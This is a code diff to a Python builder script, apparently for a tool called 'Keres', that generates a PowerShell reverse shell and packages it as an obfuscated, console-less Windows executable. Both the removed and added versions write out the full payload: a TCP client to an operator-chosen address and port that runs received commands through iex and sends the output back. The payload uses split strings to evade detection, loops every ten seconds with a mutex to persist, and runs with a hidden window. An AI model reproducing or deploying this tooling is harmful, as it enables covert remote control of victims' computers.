@@ -13,6 +13,7 @@ def display_ansi_art(file_path):
         ansi_art = file.read()
     print(ansi_art)
 
+
 def create_exe(py_file):
     try:
         icons_directory = "icons"
@@ -20,27 +21,39 @@ def create_exe(py_file):
         is_windows = platform.system().lower() == "windows"
         python_executable = "python" if is_windows else "python3"
         nuitka_command = [
-        python_executable,"-m", "nuitka",
-    "--onefile",
-    "--company-name=Keres",
-    "--file-version=1.2",
-    "--copyright=COPYRIGHT@Keres",
-    "--trademarks=No Enemies",
-    f"--windows-icon-from-ico=icons/keres.ico",
-    "--disable-console",
-    "--standalone",
-    "--remove-output",
-    f"--output-dir=Output",
-    f"--output-filename=Keres",
-    "--include-package=pyarmor_runtime_000000",
-    py_file
-]
-        subprocess.run(["pyarmor", "cfg", "restrict_module=0"])
-        subprocess.run(["pyarmor", "g", "pewpew.py"])
-        subprocess.run(nuitka_command)
-        print("Executable created successfully.")
+            python_executable, "-m", "nuitka",
+            "--onefile",
+            "--company-name=Keres",
+            "--file-version=1.2",
+            "--copyright=COPYRIGHT@Keres",
+            "--trademarks=No Enemies",
+            f"--windows-icon-from-ico=icons/keres.ico",
+            "--disable-console",
+            "--standalone",
+            "--remove-output",
+            f"--output-dir=Output",
+            f"--output-filename=Keres",
+            "--include-package=pyarmor_runtime_000000",
+            py_file
+        ]
+        try:
+            subprocess.run(["pyarmor", "cfg", "restrict_module=0"])
+        except subprocess.CalledProcessError as e:
+            print(f"Error in subprocess: {e}")
+
+        try:
+            subprocess.run(["pyarmor", "g", "pewpew.py"])
+        except subprocess.CalledProcessError as e:
+            print(f"Error in subprocess: {e}")
+
+        try:
+            subprocess.run(nuitka_command)
+        except subprocess.CalledProcessError as e:
+            print(f"Error in subprocess: {e}")
+
+        print("Executable creation process completed.")
     except Exception as e:
-        print("An error occurred:", str(e))
+        print(f"An error occurred: {e}")
 def encode_powershell_command(command):
     # """"""""""""""
     command_bytes = command.encode('utf-16-le')
@@ -81,25 +94,52 @@ def main():
     server_address = args.address
     port_number = args.port
     global pow
-    ps_command = f'''echo 'hello i am merikh' ; $uniqueIdentifier = "Keres" ;while ($true) {{ 
-        $mutex = New-Object Threading.Mutex($false, $mutexName)
+    ps_command = f'''
+function Start-PersistentCommand {{
+    param (
+        [string]$UniqueIdentifier,
+        [string]$ServerAddress,
+        [int]$PortNumber
+    )
+    while ($true) {{
+        $mutex = New-Object System.Threading.Mutex($false, $UniqueIdentifier)
         if ($mutex.WaitOne(0, $false)) {{
             try {{
-                $isRunning = Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Where-Object {{ $_.CommandLine -like "*$uniqueIdentifier*" }};
-                if (-not $isRunning) {{ 
-                    Start-Process $PSHOME\powe''rshell.exe -ArgumentList {{$uniqueIdentifier;$client = New-Object Sys''tem.N''et.Sock''ets.TCPCl''ient('{server_address}',{port_number});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName S''ystem.T''ext.AS''CIIE''ncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()}} -WindowStyle Hid''den 
-                }} else {{
+                $isRunning = Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Where-Object {{ $_.CommandLine -like "*$UniqueIdentifier*" }}
+                if (-not $isRunning) {{
+                    $client = New-Object Sys''tem.N''et.Soc''kets.Tc''pCl''ient($ServerAddress, $PortNumber)
+                    $stream = $client.GetStream()
+                    while ($true) {{
+                        $bytes = New-Object byte[] 65535
+                        $i = $stream.Read($bytes, 0, $bytes.Length)
+                        if ($i -le 0) {{ break }}
+                        $data = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $i)
+                        $sendback = (iex $data 2>&1 | Out-String)
+                        $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
+                        $sendbyte = [System.Text.Encoding]::ASCII.GetBytes($sendback2)
+                        $stream.Write($sendbyte, 0, $sendbyte.Length)
+                        $stream.Flush()
+                    }}
+                    $client.Close()
+                }}
+                else {{
                     Write-Host "Script is already running."
-                }};  
-            }} finally {{
+                }}
+            }}
+            finally {{
                 $mutex.ReleaseMutex()
             }}
-        }} else {{
+        }}
+        else {{
             Write-Host "Another instance is already running."
-        }} 
-        Start-Sleep -Seconds 10 
-    }}'''
+        }}
+        Start-Sleep -Seconds 10
+    }}
+}}
+Start-PersistentCommand -UniqueIdentifier "Keres" -ServerAddress "{server_address}" -PortNumber {port_number}
+'''
     encoded_ps_command = encode_powershell_command(ps_command)
+    
     if args.save_ps_command:
         ps_file_path = os.path.join("Output", "Keres.ps1")
         with open(ps_file_path, 'w') as ps_file:
@@ -138,6 +178,7 @@ def main():
     print('\n')
     create_exe('./dist/pewpew.py')
     print("Finished creating the executable in Output folder.")
+    print(encoded_ps_command)
 
 if __name__ == "__main__":
     main()
